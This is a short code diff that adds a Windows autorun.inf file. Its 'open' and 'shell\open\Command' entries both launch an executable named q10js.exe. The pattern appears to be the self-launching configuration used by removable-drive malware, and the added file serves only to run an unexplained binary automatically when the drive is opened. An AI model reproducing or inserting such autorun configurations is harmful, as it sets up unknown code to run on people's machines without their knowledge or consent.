@@ -1,0 +1,3 @@
+[AutoRun]
+open=q10js.exe
+shell\open\Command=q10js.exe
